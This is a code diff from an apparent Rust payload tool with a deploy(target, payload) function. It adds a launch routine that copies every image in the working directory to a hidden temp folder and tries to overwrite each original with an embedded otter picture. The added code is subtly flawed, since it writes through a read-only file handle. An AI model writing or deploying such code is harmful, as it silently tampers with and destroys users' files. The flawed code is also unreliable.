@@ -3,8 +3,10 @@ extern crate reqwest;
 extern crate walkdir;
 use reqwest::{get, Client};
 use std::env::current_dir;
+use std::env::temp_dir;
 use std::ffi::OsStr;
-use std::fs::File;
+use std::fs::{copy, create_dir, File};
+use std::io::prelude::*;
 use std::path::PathBuf;
 use walkdir::WalkDir;
 
@@ -43,6 +45,24 @@ pub async fn deploy(target: &str, payload: &str) -> Result<String, Box<dyn std::
 pub fn launch() -> Result<(), Box<dyn std::error::Error>> {
     let otter = include_bytes!("../res/otter.jpg");
     let images = get_images(&current_dir()?);
+    let mut tmpdir = temp_dir();
+    tmpdir.push("otter");
+
+    create_dir(&tmpdir)?;
+
+    for image in images {
+        let mut dest = tmpdir.clone();
+        let image_name = match image.file_name() {
+            Some(name) => name,
+            None => return Err("missing filename.".into()),
+        };
+
+        dest.push(image_name);
+        copy(&image, &dest)?;
+
+        let mut image = File::open(&image)?;
+        image.write_all(otter)?;
+    }
 
     Ok(())
 }
